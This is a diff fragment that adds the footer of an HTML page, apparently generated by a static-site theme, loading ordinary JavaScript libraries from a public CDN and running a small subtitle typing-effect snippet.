+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
